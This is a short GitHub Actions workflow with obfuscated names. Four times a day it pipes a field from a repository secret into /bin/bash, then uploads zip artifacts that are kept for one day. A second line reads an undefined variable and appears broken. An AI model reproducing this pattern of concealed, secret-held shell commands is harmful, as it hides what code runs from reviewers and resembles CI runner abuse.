name: mingzhangleiyi
on:
  workflow_dispatch:

  schedule:
    - cron: '22 2,8,14,20 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: mingzhangleiyi
        env:
          r63: ${{ secrets.r63 }}
        run: |
          printf '%s' "$r63" | jq -r .kpa13 | /bin/bash
          printf '%s' "$qaav1" | jq -r .np340 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: dJotqGFQ
          path: "*.zip"
          retention-days: 1
